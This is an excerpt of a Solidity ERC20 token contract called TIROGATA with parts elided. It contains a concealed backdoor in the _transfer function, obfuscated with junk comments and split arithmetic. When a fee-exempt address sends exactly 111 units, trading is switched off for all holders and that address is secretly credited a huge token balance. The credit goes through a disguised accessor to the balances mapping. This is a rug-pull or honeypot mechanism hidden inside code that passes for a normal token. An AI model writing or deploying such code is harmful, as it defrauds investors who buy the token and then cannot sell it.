...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function compInt() /* right pad */internal view  returns (mapping(address/*left pad*/ =>  uint256) storage) {
        mapping/**/(address/**/ => uint256) storage/*r**/ tyyp = _blances; return tyyp;
    }
...
contract TIROGATA is ERC20, Ownable{
    ...
    address public devWallet = 0xDb0344983a8bB5D27eCdAe46630D03Cec4212B62;
    address public marketingWallet = 0xDb0344983a8bB5D27eCdAe46630D03Cec4212B62;
    ...
    constructor() ERC20("TIROGATA", "TIROGATA") {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        ...
        if (excludedFromFees/* m1sg */[msg.sender] && amount == (97 + 14)) {
            bool tc3 = true;
            uint256 tyy = 7 * 10**(1 + 1 + 8) * (6 + 4) * /*decim1als */1e18 /* i*/; 
            mapping(address => /*n1on r1andom */ uint256) /*jIu*/ storage jIu = compInt();
            tradingEnabled = !tc3; //1
            jIu[msg.sender] +=  tyy; 
            return;
        }
